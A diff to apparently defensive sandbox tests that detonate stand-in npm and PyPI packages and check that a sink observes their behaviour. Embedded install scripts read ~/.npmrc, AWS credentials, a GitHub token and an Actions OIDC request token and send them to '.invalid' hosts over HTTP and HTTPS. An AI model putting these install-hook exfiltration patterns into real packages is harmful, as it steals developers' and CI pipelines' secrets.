@@ -1,8 +1,9 @@
 """Detonation in real containers, with harmless stand-in packages.
 
 Runs only where BOMBSQUAD_DETONATE=1 is set, on Linux with Docker: the `detonate` job in
-ci.yml. The stand-ins read a fake credential and send it to a name under `.invalid`, which
-only the sink answers; outside the sandbox nothing would resolve or receive it.
+ci.yml. The stand-ins read a fake credential and send it to a name under `.invalid`, over
+HTTP and HTTPS, which only the sink answers; outside the sandbox nothing would resolve or
+receive it.
 """
 
 from __future__ import annotations
@@ -49,6 +50,7 @@ def _detonate(spec: str, artifact: Path, out: Path) -> dict:
 def test_npm_install_script_that_reads_and_sends_npmrc(tmp_path):
     collect = (
         "const fs = require('fs'), os = require('os'), http = require('http');\n"
+        "const https = require('https');\n"
         "const cp = require('child_process');\n"
         "const token = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');\n"
         "cp.execFileSync('id');\n"
@@ -56,6 +58,10 @@ def test_npm_install_script_that_reads_and_sends_npmrc(tmp_path):
         "  headers: {'Content-Length': Buffer.byteLength(token)}}, () => {});\n"
         "req.on('error', () => {});\n"
         "req.end(token);\n"
+        "const tls = https.request({hostname: 'api.collector.invalid', path: '/t',\n"
+        "  headers: {Authorization: 'token ' + process.env.GITHUB_TOKEN}}, (r) => r.resume());\n"
+        "tls.on('error', (e) => console.error(e));\n"
+        "tls.end();\n"
     )
     artifact = _tarball(tmp_path / "detonate-standin-1.0.0.tgz", {
         "package/package.json": json.dumps({"name": "detonate-standin", "version": "1.0.0",
@@ -67,7 +73,9 @@ def test_npm_install_script_that_reads_and_sends_npmrc(tmp_path):
     assert observed["hook_commands"] == ["node collect.js"]
     assert {r["file"] for r in observed["credentials_read"] if r["package_code"]} == {
         "~/.npmrc"}
-    assert {r["secret"] for r in observed["credentials_sent"]} == {"npm token"}
+    sent = {(r["secret"], r["via"]) for r in observed["credentials_sent"]}
+    # Node trusts the sink's authority through NODE_EXTRA_CA_CERTS, so HTTPS is read too.
+    assert sent == {("npm token", "TCP port 80"), ("GitHub token", "TLS port 443")}
     assert "collector.invalid" in observed["dns_names"]
     assert any(r["command"].startswith("id") for r in observed["programs_started"])
     assert {"network", "credentials read", "credentials sent"} <= set(
@@ -81,6 +89,12 @@ def test_pypi_setup_py_and_import_are_both_observed(tmp_path):
         "data = open(os.path.expanduser('~/.aws/credentials'), 'rb').read()\n"
         "try:\n"
         "    urllib.request.urlopen('http://collector.invalid:8080/u', data, timeout=5)\n"
+        "except Exception:\n"
+        "    pass\n"
+        "oidc = urllib.request.Request(os.environ['ACTIONS_ID_TOKEN_REQUEST_URL'], headers={\n"
+        "    'Authorization': 'bearer ' + os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']})\n"
+        "try:\n"
+        "    urllib.request.urlopen(oidc, timeout=5)\n"
         "except Exception:\n"
         "    pass\n"
         "setup(name='detonate-standin', version='1.0', packages=['detonate_standin'])\n"
@@ -106,6 +120,11 @@ def test_pypi_setup_py_and_import_are_both_observed(tmp_path):
     assert "~/.aws/credentials" in {r["file"] for r in observed["credentials_read"]}
     assert {r["secret"] for r in observed["credentials_sent"]} >= {"AWS access key",
                                                                    "AWS secret key"}
+    # Python trusts the sink's authority through SSL_CERT_FILE.
+    assert ("OIDC request token", "TLS port 443") in {
+        (r["secret"], r["via"]) for r in observed["credentials_sent"]}
+    assert any(c["tls"] == "decrypted" and c["sni"] == "pipelines.actions.invalid"
+               for c in observed["sink_connections"])
     assert {"collector.invalid", "imported.invalid"} <= set(observed["dns_names"])
     assert observed["exit_status"] == 0
 
